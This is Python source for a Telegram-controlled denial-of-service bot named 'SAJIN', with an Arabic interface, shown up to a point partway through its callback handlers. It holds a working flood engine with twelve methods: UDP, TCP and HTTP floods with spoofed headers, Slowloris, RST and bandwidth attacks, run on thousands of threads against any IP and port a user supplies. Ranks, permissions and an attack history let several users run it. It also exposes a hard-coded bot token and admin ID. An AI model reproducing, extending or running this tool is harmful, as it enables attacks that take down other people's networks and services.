# -*- coding: utf-8 -*-
# =============================================================================
#  ███████╗ █████╗      ██╗██╗███╗   ██╗    ██╗  ██╗███████╗██╗     ██╗
#  ██╔════╝██╔══██╗     ██║██║████╗  ██║    ██║  ██║██╔════╝██║     ██║
#  ███████╗███████║     ██║██║██╔██╗ ██║    ███████║█████╗  ██║     ██║
#  ╚════██║██╔══██║██   ██║██║██║╚██╗██║    ██╔══██║██╔══╝  ██║     ██║
#  ███████║██║  ██║╚█████╔╝██║██║ ╚████║    ██║  ██║███████╗███████╗███████╗
#  ╚══════╝╚═╝  ╚═╝ ╚════╝ ╚═╝╚═╝  ╚═══╝    ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
#
#                              v 6 . 0
#                       S A J I N   |   @A0_XX
# =============================================================================

import os, re, sys, time, json, math, random, socket, struct
import string, sqlite3, hashlib, threading, ipaddress, subprocess
from datetime import datetime, timedelta
from collections import defaultdict, deque, Counter
from concurrent.futures import ThreadPoolExecutor, as_completed

import telebot
from telebot import types

# =============================================================================
# [01] CONFIG
# =============================================================================
TOKEN      = '8831454723:AAGNhmufIGw_0RcO8Pi2W8HJVTmPN4xcpHs'
ADMIN_ID   = 8206337665
DEV_NAME   = "SAJIN"
DEV_HANDLE = "@A0_XX"
BOT_NAME   = "SAJIN"
VERSION    = "TOP s1"
RIGHTS     = f"SAJIN | {DEV_HANDLE}"

MAX_THREADS   = 8000
DEFAULT_TH    = 1500
PAYLOAD_SIZE  = 8192
CHUNK_SIZE    = 65507
SOCK_BUF      = 2 ** 23
TCP_TIMEOUT   = 0.30
CONN_POOL_MAX = 1200
BURST_PER_LOOP = 12

START_TS = time.time()
DB_FILE  = "sajin_v6.db"

bot = telebot.TeleBot(TOKEN, parse_mode=None)

# =============================================================================
# [02] UI (framed, no childish emoji)
# =============================================================================
class U:
    # خطوط وأطر
    HL = "━"
    DL = "═"
    VL = "┃"
    TL = "┏"
    TR = "┓"
    BL = "┗"
    BR = "┛"
    LM = "┣"
    RM = "┫"

    # رموز رسمية
    DAGGER  = "†"
    AXE     = "⚔"
    TARGET  = "◎"
    RADAR   = "◈"
    WAVE    = "≈"
    BOLT    = "⚡"
    FIRE    = "◆"
    KEY     = "⌘"
    LOCK    = "🔒"
    CROWN   = "♛"
    STAR    = "★"
    DOT     = "•"
    ARROW   = "→"
    CHECK   = "✓"
    CROSS   = "✗"
    GEAR    = "⚙"
    FOLDER  = "▣"
    CHART   = "▤"
    CLOCK   = "◷"
    SHIELD  = "⛨"

    @staticmethod
    def frame(title, w=34):
        t = f" {title} "
        pad = max(0, w - len(t))
        l = pad // 2
        r = pad - l
        return f"{U.HL*l}{t}{U.HL*r}"

    @staticmethod
    def box(title, lines, w=36):
        out = [f"┏{'━'*(w-2)}┓"]
        out.append(f"┃ {title:<{w-4}} ┃")
        out.append(f"┣{'━'*(w-2)}┫")
        for ln in lines:
            out.append(f"┃ {ln:<{w-4}} ┃")
        out.append(f"┗{'━'*(w-2)}┛")
        return "\n".join(out)

    @staticmethod
    def bar(pct, n=22):
        pct = max(0, min(100, pct))
        f = int(n * pct / 100)
        return "█" * f + "░" * (n - f)

# =============================================================================
# [03] HELPERS
# =============================================================================
def human_b(n):
    for u in ["B","KB","MB","GB","TB"]:
        if n < 1024: return f"{n:.2f} {u}"
        n /= 1024
    return f"{n:.2f} PB"

def human_t(s):
    s = int(s)
    d, s = divmod(s, 86400)
    h, s = divmod(s, 3600)
    m, s = divmod(s, 60)
    out = []
    if d: out.append(f"{d}d")
    if h: out.append(f"{h}h")
    if m: out.append(f"{m}m")
    out.append(f"{s}s")
    return " ".join(out)

def parse_target(text):
    if not text: return None, None
    t = text.strip().replace(":", " ").replace("/", " ").replace(",", " ")
    parts = t.split()
    if len(parts) < 2: return None, None
    ip = parts[0]
    try:
        ipaddress.ip_address(ip)
        p = int(parts[1])
        if not (1 <= p <= 65535): return None, None
    except: return None, None
    return ip, p

def safe_send(cid, txt, kb=None):
    try: bot.send_message(cid, txt, reply_markup=kb)
    except: pass

def safe_edit(call, txt, kb=None):
    try: bot.edit_message_text(txt, call.message.chat.id, call.message.message_id, reply_markup=kb)
    except:
        try: bot.send_message(call.message.chat.id, txt, reply_markup=kb)
        except: pass

def is_admin(uid): return uid == ADMIN_ID

# =============================================================================
# [04] DATABASE
# =============================================================================
class DB:
    def __init__(self, path):
        self.lock = threading.Lock()
        self.conn = sqlite3.connect(path, check_same_thread=False)
        self.conn.execute("PRAGMA journal_mode=WAL")
        self._init()

    def _init(self):
        with self.lock:
            c = self.conn.cursor()
            c.execute("""CREATE TABLE IF NOT EXISTS attacks(
                aid TEXT PRIMARY KEY, ip TEXT, port INT, method TEXT,
                started REAL, ended REAL, packets INT DEFAULT 0,
                bytes INT DEFAULT 0, status TEXT, uid INT, workers INT)""")
            c.execute("""CREATE TABLE IF NOT EXISTS users(
                uid INTEGER PRIMARY KEY, uname TEXT, rank TEXT,
                added_at REAL, last_seen REAL, cmd_count INT DEFAULT 0,
                atk_count INT DEFAULT 0, banned INT DEFAULT 0)""")
            c.execute("""CREATE TABLE IF NOT EXISTS cmd_log(
                id INTEGER PRIMARY KEY AUTOINCREMENT, uid INT, ts REAL, cmd TEXT)""")
            self.conn.commit()

    def attack_start(self, aid, ip, port, method, uid, workers):
        with self.lock:
            try:
                self.conn.execute(
                    "INSERT OR REPLACE INTO attacks VALUES(?,?,?,?,?,?,?,?,?,?,?)",
                    (aid, ip, port, method, time.time(), None, 0, 0, "running", uid, workers))
                self.conn.commit()
            except: pass

    def attack_end(self, aid, pk, by):
        with self.lock:
            try:
                self.conn.execute("UPDATE attacks SET ended=?, packets=?, bytes=?, status='stopped' WHERE aid=?",
                                  (time.time(), pk, by, aid))
                self.conn.commit()
            except: pass

    def pending(self):
        with self.lock:
            c = self.conn.cursor()
            c.execute("SELECT aid,ip,port,method,uid,workers FROM attacks WHERE status='running'")
            return c.fetchall()

    def recent(self, n=10):
        with self.lock:
            c = self.conn.cursor()
            c.execute("""SELECT aid,ip,port,method,started,packets,bytes,uid
                         FROM attacks ORDER BY started DESC LIMIT ?""", (n,))
            return c.fetchall()

    def user_put(self, uid, uname, rank):
        with self.lock:
            try:
                now = time.time()
                self.conn.execute(
                    """INSERT INTO users(uid, uname, rank, added_at, last_seen, cmd_count)
                       VALUES(?,?,?,?,?,1)
                       ON CONFLICT(uid) DO UPDATE SET
                           last_seen=excluded.last_seen,
                           cmd_count=cmd_count+1,
                           uname=excluded.uname""",
                    (uid, uname or "", rank, now, now))
                self.conn.commit()
            except: pass

    def user_get(self, uid):
        with self.lock:
            c = self.conn.cursor()
            c.execute("SELECT uid,uname,rank,added_at,last_seen,cmd_count,atk_count,banned FROM users WHERE uid=?", (uid,))
            return c.fetchone()

    def user_all(self):
        with self.lock:
            c = self.conn.cursor()
            c.execute("SELECT uid,uname,rank,banned,atk_count FROM users ORDER BY last_seen DESC")
            return c.fetchall()

    def user_rank(self, uid, rank):
        with self.lock:
            try:
                self.conn.execute("UPDATE users SET rank=? WHERE uid=?", (rank, uid))
                self.conn.commit()
            except: pass

    def user_ban(self, uid, b):
        with self.lock:
            try:
                self.conn.execute("UPDATE users SET banned=? WHERE uid=?", (int(b), uid))
                self.conn.commit()
            except: pass

    def user_atk(self, uid):
        with self.lock:
            try:
                self.conn.execute("UPDATE users SET atk_count=atk_count+1 WHERE uid=?", (uid,))
                self.conn.commit()
            except: pass

    def user_del(self, uid):
        with self.lock:
            try:
                self.conn.execute("DELETE FROM users WHERE uid=?", (uid,))
                self.conn.commit()
            except: pass

    def cmd(self, uid, cmd):
        with self.lock:
            try:
                self.conn.execute("INSERT INTO cmd_log(uid, ts, cmd) VALUES(?,?,?)", (uid, time.time(), cmd))
                self.conn.commit()
            except: pass

DB = DB(DB_FILE)

# =============================================================================
# [05] RANKS & AUTH
# =============================================================================
class Rank:
    OWNER  = "owner"
    ADMIN  = "admin"
    MOD    = "mod"
    USER   = "user"
    VIEWER = "viewer"

    P = {
        "owner" : {"attack","stop","stopall","users","view","settings"},
        "admin" : {"attack","stop","stopall","users","view"},
        "mod"   : {"attack","stop","stopall","view"},
        "user"  : {"attack","stop","view"},
        "viewer": {"view"},
    }

    @staticmethod
    def can(r, a): return a in Rank.P.get(r, set())

DB.user_put(ADMIN_ID, "SAJIN", Rank.OWNER)

class Auth:
    def __init__(self):
        self.lock = threading.Lock()
        self.cache = {ADMIN_ID: {"rank": Rank.OWNER, "banned": 0}}

    def _load(self, uid):
        row = DB.user_get(uid)
        if not row: return None
        info = {"rank": row[2] or "user", "banned": row[7] or 0}
        with self.lock: self.cache[uid] = info
        return info

    def get(self, uid):
        if uid == ADMIN_ID: return {"rank": Rank.OWNER, "banned": 0}
        with self.lock:
            if uid in self.cache: return self.cache[uid]
        return self._load(uid)

    def ok(self, uid):
        i = self.get(uid)
        return bool(i) and not i["banned"]

    def can(self, uid, act):
        if uid == ADMIN_ID: return True
        i = self.get(uid)
        if not i or i["banned"]: return False
        return Rank.can(i["rank"], act)

AUTH = Auth()

# =============================================================================
# [06] STATS
# =============================================================================
class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.attacks = 0
        self.packets = 0
        self.bytes   = 0
        self.errors  = 0
        self.active  = {}
        self.history = deque(maxlen=200)
        self.by_method = Counter()
        self.by_target = Counter()

    def new(self, aid, info):
        with self.lock:
            self.attacks += 1
            self.by_method[info["method"]] += 1
            self.by_target[f"{info['ip']}:{info['port']}"] += 1
            self.active[aid] = {"info": info, "start": time.time(), "packets": 0, "bytes": 0}

    def update(self, aid, pk=0, sz=0):
        with self.lock:
            a = self.active.get(aid)
            if not a: return
            a["packets"] += pk; a["bytes"] += sz
            self.packets += pk; self.bytes += sz

    def err(self):
        with self.lock: self.errors += 1

    def stop(self, aid):
        with self.lock:
            a = self.active.pop(aid, None)
            if a:
                a["duration"] = time.time() - a["start"]
                self.history.append((aid, a))
            return a

    def active_list(self):
        with self.lock: return dict(self.active)

    def snap(self):
        with self.lock:
            return {"uptime": time.time() - START_TS, "attacks": self.attacks,
                    "packets": self.packets, "bytes": self.bytes,
                    "errors": self.errors, "active": len(self.active)}

S = Stats()

# =============================================================================
# [07] STATE
# =============================================================================
class State:
    user_threads = DEFAULT_TH
    user_method  = None
    attacks = {}
    counter = 0
    lock = threading.Lock()

    @classmethod
    def nid(cls):
        with cls.lock:
            cls.counter += 1
            return f"A{cls.counter:05d}"

ST = State()

# =============================================================================
# [08] PAYLOAD FACTORY
# =============================================================================
HTTP_METHODS = ["GET","POST","HEAD","PUT","DELETE","OPTIONS","PATCH"]
HTTP_PATHS   = ["/","/index.php","/admin","/login","/api","/api/v1","/wp-admin",
                "/xmlrpc.php","/.env","/.git","/config","/backup","/dashboard",
                "/panel","/phpmyadmin","/user","/profile","/upload","/download",
                "/cgi-bin/","/console","/manager/html","/solr/","/actuator"]
USER_AGENTS  = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "curl/7.68.0","Wget/1.20.3","Go-http-client/1.1",
]

def rbytes(n): return os.urandom(n)
def rstr(n): return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

def http_req(host):
    m = random.choice(HTTP_METHODS)
    p = random.choice(HTTP_PATHS)
    ua = random.choice(USER_AGENTS)
    xff = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    return (f"{m} {p} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: */*\r\n"
            f"Accept-Language: en-US,en;q=0.9\r\n"
            f"Connection: keep-alive\r\n"
            f"X-Forwarded-For: {xff}\r\n"
            f"Cache-Control: no-cache\r\n\r\n").encode()

# =============================================================================
# [09] SOCKET UTILITIES
# =============================================================================
def sock_udp():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try: s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCK_BUF)
        except: pass
        return s
    except: return None

def sock_tcp(t=TCP_TIMEOUT):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.settimeout(t)
        try: s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except: pass
        return s
    except: return None

def sclose(s):
    try:
        if s: s.close()
    except: pass

# =============================================================================
# [10] ATTACK ENGINE - 12 METHOD
# =============================================================================
class Engine:
    def __init__(self, ip, port, method, aid, workers, uid):
        self.ip = ip
        self.port = port
        self.method = method
        self.aid = aid
        self.workers = workers
        self.uid = uid
        self.alive = True
        self.start = time.time()

    # ---------- 01 UDP ----------
    def udp(self):
        s = sock_udp()
        if not s: return
        p = rbytes(PAYLOAD_SIZE)
        while self.alive:
            try:
                for _ in range(BURST_PER_LOOP):
                    s.sendto(p, (self.ip, self.port))
                    S.update(self.aid, 1, len(p))
            except:
                S.err(); sclose(s); s = sock_udp()
                if not s: break

    # ---------- 02 UDP_MEGA ----------
    def udp_mega(self):
        s = sock_udp()
        if not s: return
        p = rbytes(CHUNK_SIZE)
        while self.alive:
            try:
                s.sendto(p, (self.ip, self.port))
                S.update(self.aid, 1, len(p))
            except:
                S.err(); sclose(s); s = sock_udp()
                if not s: break

    # ---------- 03 UDP_RND ----------
    def udp_rnd(self):
        s = sock_udp()
        if not s: return
        while self.alive:
            try:
                p = rbytes(random.randint(64, 1400))
                s.sendto(p, (self.ip, random.randint(1, 65535)))
                S.update(self.aid, 1, len(p))
            except: S.err()

    # ---------- 04 UDP_BURST ----------
    def udp_burst(self):
        socks = [sock_udp() for _ in range(16)]
        socks = [s for s in socks if s]
        if not socks: return
        p = rbytes(1400)
        while self.alive:
            for s in socks:
                try:
                    s.sendto(p, (self.ip, self.port))
                    S.update(self.aid, 1, len(p))
                except: pass

    # ---------- 05 TCP ----------
    def tcp(self):
        p = rbytes(PAYLOAD_SIZE)
        while self.alive:
            s = sock_tcp()
            if not s: continue
            try:
                s.connect((self.ip, self.port))
                for _ in range(20):
                    if not self.alive: break
                    s.sendall(p)
                    S.update(self.aid, 1, len(p))
            except: S.err()
            finally: sclose(s)

    # ---------- 06 TCP_BURST ----------
    def tcp_burst(self):
        while self.alive:
            pool = []
            for _ in range(40):
                s = sock_tcp(0.15)
                if not s: continue
                try:
                    s.connect((self.ip, self.port))
                    pool.append(s)
                    S.update(self.aid, 1, 0)
                except: sclose(s)
            for s in pool:
                try: s.sendall(b"X" * 512)
                except: pass
                sclose(s)

    # ---------- 07 HTTP ----------
    def http(self):
        host = f"{self.ip}:{self.port}"
        while self.alive:
            s = sock_tcp()
            if not s: continue
            try:
                s.connect((self.ip, self.port))
                for _ in range(30):
                    if not self.alive: break
                    r = http_req(host)
                    s.sendall(r)
                    S.update(self.aid, 1, len(r))
            except: S.err()
            finally: sclose(s)

    # ---------- 08 SLOW (تعليق الاتصال كامل) ----------
    def slow(self):
        pool = []
        while self.alive:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((self.ip, self.port))
                pool.append(s)
                S.update(self.aid, 1, 0)
                if len(pool) > CONN_POOL_MAX:
                    sclose(pool.pop(0))
            except: time.sleep(0.02)
        for s in pool: sclose(s)

    # ---------- 09 SLOWLORIS ----------
    def slowloris(self):
        pool = []
        host = f"{self.ip}:{self.port}"
        while self.alive:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(6)
                s.connect((self.ip, self.port))
                h = f"GET /?{rstr(10)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: SAJIN-SLOW/6\r\n"
                s.send(h.encode())
                pool.append(s)
                S.update(self.aid, 1, len(h))
                for s2 in list(pool):
                    try: s2.send(f"X-Keep: {rstr(6)}\r\n".encode())
                    except:
                        pool.remove(s2); sclose(s2)
                if len(pool) > CONN_POOL_MAX:
                    sclose(pool.pop(0))
            except: time.sleep(0.05)
        for s in pool: sclose(s)

    # ---------- 10 TCP_RST ----------
    def tcp_rst(self):
        while self.alive:
            s = sock_tcp(0.10)
            if not s: continue
            try:
                s.connect((self.ip, self.port))
                s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
                S.update(self.aid, 1, 0)
            except: S.err()
            finally: sclose(s)

    # ---------- 11 BANDWIDTH (حمولة ضخمة) ----------
    def bandwidth(self):
        s = sock_udp()
        if not s: return
        p = rbytes(CHUNK_SIZE)
        while self.alive:
            try:
                for _ in range(4):
                    s.sendto(p, (self.ip, self.port))
                    S.update(self.aid, 1, len(p))
            except: S.err()

    # ---------- 12 MIX ----------
    def mix(self):
        pool = [self.udp, self.tcp, self.http, self.udp_mega,
                self.slow, self.tcp_burst, self.udp_burst]
        random.choice(pool)()

    def dispatch(self):
        m = {
            "UDP": self.udp, "UDP_MEGA": self.udp_mega, "UDP_RND": self.udp_rnd,
            "UDP_BURST": self.udp_burst,
            "TCP": self.tcp, "TCP_BURST": self.tcp_burst,
            "HTTP": self.http,
            "SLOW": self.slow, "SLOWLORIS": self.slowloris,
            "TCP_RST": self.tcp_rst,
            "BANDWIDTH": self.bandwidth,
            "MIX": self.mix,
        }.get(self.method, self.udp)
        try: m()
        except: pass

    def run(self):
        try:
            with ThreadPoolExecutor(max_workers=self.workers) as ex:
                fs = [ex.submit(self.dispatch) for _ in range(self.workers)]
                for f in as_completed(fs):
                    if not self.alive: break
                    try: f.result()
                    except: pass
        except: pass
        a = S.stop(self.aid)
        if a: DB.attack_end(self.aid, a["packets"], a["bytes"])

    def stop(self): self.alive = False

# =============================================================================
# [11] KEYBOARDS
# =============================================================================
def kb_main():
    m = types.InlineKeyboardMarkup(row_width=2)
    m.add(types.InlineKeyboardButton("◆ بدء هجوم", callback_data="menu:attack"),
          types.InlineKeyboardButton("✗ إيقاف الكل", callback_data="act:stopall"))
    m.add(types.InlineKeyboardButton("▤ الإحصائيات", callback_data="menu:stats"),
          types.InlineKeyboardButton("◈ الهجمات الحية", callback_data="menu:live"))
    m.add(types.InlineKeyboardButton("⚙ الإعدادات", callback_data="menu:settings"),
          types.InlineKeyboardButton("⌘ المستخدمون", callback_data="menu:users"))
    m.add(types.InlineKeyboardButton("◎ الأساليب", callback_data="menu:methods"),
          types.InlineKeyboardButton("◷ السجل", callback_data="menu:history"))
    m.add(types.InlineKeyboardButton(f"♛ {DEV_HANDLE}", url=f"https://t.me/{DEV_HANDLE.lstrip('@')}"))
    return m

def kb_attack():
    m = types.InlineKeyboardMarkup(row_width=2)
    m.add(types.InlineKeyboardButton("⚡ UDP", callback_data="m:UDP"),
          types.InlineKeyboardButton("◆ UDP_MEGA", callback_data="m:UDP_MEGA"))
    m.add(types.InlineKeyboardButton("≈ UDP_RND", callback_data="m:UDP_RND"),
          types.InlineKeyboardButton("◆ UDP_BURST", callback_data="m:UDP_BURST"))
    m.add(types.InlineKeyboardButton("⚔ TCP", callback_data="m:TCP"),
          types.InlineKeyboardButton("⚔ TCP_BURST", callback_data="m:TCP_BURST"))
    m.add(types.InlineKeyboardButton("◎ HTTP", callback_data="m:HTTP"),
          types.InlineKeyboardButton("⛨ TCP_RST", callback_data="m:TCP_RST"))
    m.add(types.InlineKeyboardButton("🔒 SLOW", callback_data="m:SLOW"),
          types.InlineKeyboardButton("🔒 SLOWLORIS", callback_data="m:SLOWLORIS"))
    m.add(types.InlineKeyboardButton("◆ BANDWIDTH", callback_data="m:BANDWIDTH"),
          types.InlineKeyboardButton("◈ MIX", callback_data="m:MIX"))
    m.add(types.InlineKeyboardButton("✗ إبادة الكل (ALL)", callback_data="m:ALL"))
    m.add(types.InlineKeyboardButton("← رجوع", callback_data="menu:main"))
    return m

def kb_settings():
    m = types.InlineKeyboardMarkup(row_width=3)
    for n in [500, 1000, 1500, 2000, 3000, 4000, 5000, 6000, 8000]:
        m.add(types.InlineKeyboardButton(f"{n}", callback_data=f"th:{n}"))
    m.add(types.InlineKeyboardButton("← رجوع", callback_data="menu:main"))
    return m

def kb_back(t="menu:main"):
    m = types.InlineKeyboardMarkup()
    m.add(types.InlineKeyboardButton("← رجوع", callback_data=t))
    return m

def kb_stop_one(aid):
    m = types.InlineKeyboardMarkup()
    m.add(types.InlineKeyboardButton(f"✗ إيقاف {aid}", callback_data=f"act:stop:{aid}"))
    m.add(types.InlineKeyboardButton("◈ تحديث", callback_data="menu:live"))
    m.add(types.InlineKeyboardButton("← رجوع", callback_data="menu:main"))
    return m

def kb_users():
    m = types.InlineKeyboardMarkup(row_width=2)
    m.add(types.InlineKeyboardButton("➕ إضافة مستخدم", callback_data="usr:add"),
          types.InlineKeyboardButton("✗ حذف مستخدم", callback_data="usr:del"))
    m.add(types.InlineKeyboardButton("⌘ تغيير الرتبة", callback_data="usr:rank"),
          types.InlineKeyboardButton("⛔ حظر", callback_data="usr:ban"))
    m.add(types.InlineKeyboardButton("◈ قائمة المستخدمين", callback_data="usr:list"),
          types.InlineKeyboardButton("✓ رفع الحظر", callback_data="usr:unban"))
    m.add(types.InlineKeyboardButton("← رجوع", callback_data="menu:main"))
    return m

def kb_ranks():
    m = types.InlineKeyboardMarkup(row_width=2)
    m.add(types.InlineKeyboardButton("OWNER", callback_data="rk:owner"),
          types.InlineKeyboardButton("ADMIN", callback_data="rk:admin"))
    m.add(types.InlineKeyboardButton("MOD", callback_data="rk:mod"),
          types.InlineKeyboardButton("USER", callback_data="rk:user"))
    m.add(types.InlineKeyboardButton("VIEWER", callback_data="rk:viewer"))
    m.add(types.InlineKeyboardButton("← رجوع", callback_data="menu:users"))
    return m

# =============================================================================
# [12] HANDLERS - COMMANDS
# =============================================================================
@bot.message_handler(commands=['start'])
def c_start(m):
    uid = m.from_user.id
    if not AUTH.ok(uid):
        safe_send(m.chat.id, "⛔ وصول مرفوض"); return
    DB.user_put(uid, m.from_user.username or m.from_user.first_name or "", AUTH.get(uid)["rank"])
    DB.cmd(uid, "/start")
    snap = S.snap()
    txt = "\n".join([
        U.frame(f"{BOT_NAME} {VERSION}"),
        f"┃ المطور : {DEV_NAME}",
        f"┃ الرتبة : {AUTH.get(uid)['rank'].upper()}",
        f"┃ الثريد : {ST.user_threads}",
        f"┃ النشطة : {snap['active']}",
        f"┃ الحِزم  : {snap['packets']:,}",
        U.frame(" ✧ اليلعب ويا الذيب يتحمل التعذيب ✧ "),
    ])
    safe_send(m.chat.id, txt, kb_main())

@bot.message_handler(commands=['help'])
def c_help(m):
    if not AUTH.ok(m.from_user.id): return
    txt = "\n".join([
        U.frame("الأوامر"),
        "/start   - القائمة",
        "/stats   - إحصائيات",
        "/live    - الحية",
        "/stop    - إيقاف الكل",
        "/users   - المستخدمون",
        "/history - السجل",
        "/id      - معرّفك",
        U.frame("SAJIN"),
    ])
    safe_send(m.chat.id, txt)

@bot.message_handler(commands=['id'])
def c_id(m):
    safe_send(m.chat.id, f"معرّفك: {m.from_user.id}")

@bot.message_handler(commands=['stats'])
def c_stats(m):
    if not AUTH.ok(m.from_user.id): return
    s = S.snap()
    txt = "\n".join([
        U.frame("إحصائيات مفصلة"),
        f"التشغيل : {human_t(s['uptime'])}",
        f"الهجمات : {s['attacks']}",
        f"الحِزم  : {s['packets']:,}",
        f"البيانات: {human_b(s['bytes'])}",
        f"النشطة  : {s['active']}",
        f"الأخطاء : {s['errors']}",
        U.frame("SAJIN"),
    ])
    safe_send(m.chat.id, txt)

@bot.message_handler(commands=['stop'])
def c_stop(m):
    if not AUTH.can(m.from_user.id, "stopall"): return
    n = stop_all()
    safe_send(m.chat.id, f"تم إيقاف {n} هجوم")

@bot.message_handler(commands=['live'])
def c_live(m):
    if not AUTH.ok(m.from_user.id): return
    show_live(m.chat.id)

@bot.message_handler(commands=['users'])
def c_users(m):
    if not AUTH.can(m.from_user.id, "users"): return
    rows = DB.user_all()
    lines = [U.frame("المستخدمون")]
    for r in rows[:20]:
        uid, un, rk, bn, atk = r
        mark = "⛔" if bn else "✓"
        lines.append(f"{mark} {uid} [{rk}] {un or '-'} · {atk} atk")
    lines.append(U.frame("SAJIN"))
    safe_send(m.chat.id, "\n".join(lines), kb_users())

@bot.message_handler(commands=['history'])
def c_hist(m):
    if not AUTH.ok(m.from_user.id): return
    rows = DB.recent(10)
    if not rows:
        safe_send(m.chat.id, "لا يوجد سجل."); return
    lines = [U.frame("آخر الهجمات")]
    for r in rows:
        aid, ip, port, meth, st, pk, by, uid = r
        lines.append(f"{aid} {ip}:{port} [{meth}] {pk:,}p")
    lines.append(U.frame("SAJIN"))
    safe_send(m.chat.id, "\n".join(lines))

# =============================================================================
# [13] HANDLERS - CALLBACKS
# =============================================================================
@bot.callback_query_handler(func=lambda c: True)
def cb(call):
    uid = call.from_user.id
    if not AUTH.ok(uid):
        try: bot.answer_callback_query(call.id, "⛔")
        except: pass
        return

    d = call.data

    # ---------------- MENUS ----------------
    if d == "menu:main":
        s = S.snap()
        txt = "\n".join([
            U.frame(f"{BOT_NAME} {VERSION}"),
            f"┃ المطور : {DEV_NAME}",
            f"┃ الثريد : {ST.user_threads}",
            f"┃ النشطة : {s['active']}",
            f"┃ الحِزم  : {s['packets']:,}",
            U.frame("SAJIN"),
        ])
        safe_edit(call, txt, kb_main())

    elif d == "menu:attack":
        if not AUTH.can(uid, "attack"):
            try: bot.answer_callback_query(call.id, "⛔ لا صلاحية")
            except: pass
            return
        txt = "\n".join([
            U.frame("اختر الميثود"),
            "⚡ UDP      - سريع أساسي",
            "◆ UDP_MEGA - حزم كبرى",
            "≈ UDP_RND  - منافذ عشوائية",
            "◆ UDP_BURST- 16 سوكت متوازي",
            "⚔ TCP      - عنيف",
            "⚔ TCP_BURST- اتصالات كتلية",
            "◎ HTTP     - طبقة 7",
            "⛨ TCP_RST  - إغلاق قسري",
            "🔒 SLOW    - تعليق كامل",
            "🔒 SLOWLORIS - نبض بطيء",
            "◆ BANDWIDTH - حمولة قصوى",
            "◈ MIX      - خليط",
            U.frame("SAJIN"),
        ])
        safe_edit(call, txt, kb_attack())

    elif d == "menu:stats":
        s = S.snap()
        bm, bt, _ = S.top(5) if hasattr(S, "top") else ([], [], [])
        txt = "\n".join([
            U.frame("إحصائيات"),
            f"التشغيل : {human_t(s['uptime'])}",
            f"الهجمات : {s['attacks']}",
            f"الحِزم  : {s['packets']:,}",
            f"البيانات: {human_b(s['bytes'])}",
            f"النشطة  : {s['active']}",
            f"الأخطاء : {s['errors']}",
            U.frame("SAJIN"),
        ])
        safe_edit(call, txt, kb_back())

    elif d == "menu:live":
        show_live(call.message.chat.id, call)

    elif d == "menu:settings":
        safe_edit(call, "\n".join([
            U.frame("الإعدادات"),
            f"الثريدات الحالية: {ST.user_threads}",
            "اختر عدداً:",
            U.frame("SAJIN"),
        ]), kb_settings())

    elif d == "menu:methods":
        safe_edit(call, "\n".join([
            U.frame("الأساليب"),
            "UDP · UDP_MEGA · UDP_RND · UDP_BURST",
            "TCP · TCP_BURST · TCP_RST",
            "HTTP · SLOW · SLOWLORIS",
            "BANDWIDTH · MIX · ALL",
            U.frame("SAJIN"),
        ]), kb_back())

    elif d == "menu:history":
        rows = DB.recent(15)
        lines = [U.frame("السجل")]
        for r in rows:
            aid, ip, port, meth, st, pk, by, uid = r
            lines.append(f"{aid} {ip}:{port} [{meth}] {pk:,}p")
        lines.append(U.frame("SAJIN"))
        safe_edit(call, "\n".join(lines), kb_back())

    elif d == "menu:users":
        if not AUTH.can(uid, "users"):
            try: bot.answer_callback_query(call.id, "⛔")
            except: pass
            return
        safe_edit(call, "\n".join([
            U.frame("إدارة المستخدمين"),
            "استخدم الأزرار أدناه.",
            U.frame("SAJIN"),
        ]), kb_users())

    # ---------------- USER MANAGEMENT ----------------
    elif d == "usr:list":
        if not AUTH.can(uid, "users"): return
        rows = DB.user_all()
        lines = [U.frame("المستخدمون")]
        for r in rows[:25]:
            uid_, un, rk, bn, atk = r
            mark = "⛔" if bn else "✓"
            lines.append(f"{mark} {uid_} [{rk}] {un or '-'} · {atk}")
        lines.append(U.frame("SAJIN"))
        safe_edit(call, "\n".join(lines), kb_users())

    elif d == "usr:add":
        if not AUTH.can(uid, "users"): return
        safe_edit(call, "\n".join([
            U.frame("إضافة مستخدم"),
            "أرسل:",
            "USER_ID RANK",
            "مثال:",
            "123456789 user",
            U.frame("SAJIN"),
        ]), kb_back("menu:users"))
        bot.register_next_step_handler_by_chat_id(call.message.chat.id, user_add_flow)

    elif d == "usr:del":
        if not AUTH.can(uid, "users"): return
        safe_edit(call, "\n".join([
            U.frame("حذف مستخدم"),
            "أرسل USER_ID:",
            U.frame("SAJIN"),
        ]), kb_back("menu:users"))
        bot.register_next_step_handler_by_chat_id(call.message.chat.id, user_del_flow)

    elif d == "usr:rank":
        if not AUTH.can(uid, "users"): return
        safe_edit(call, "\n".join([
            U.frame("تغيير الرتبة"),
            "أرسل:",
            "USER_ID RANK",
            U.frame("SAJIN"),
        ]), kb_back("menu:users"))
        bot.register_next_step_handler_by_chat_id(call.message.chat.id, user_rank_flow)

    elif d == "usr:ban":
        if not AUTH.can(uid, "users"): return
        safe_edit(call, "\n".join([
            U.frame("حظر مستخدم"),
            "أرسل USER_ID:",
            U.frame("SAJIN"),
        ]), kb_back("menu:users"))
        bot.register_next_step_handler_by_chat_id(call.message.chat.id, user_ban_flow)

    elif d == "usr:unban":
        if not AUTH.can(uid, "users"): return
        safe_edit(call, "\n".join([
            U.frame("رفع الحظر"),
            "أرسل USER_ID:",
            U.frame("SAJIN"),
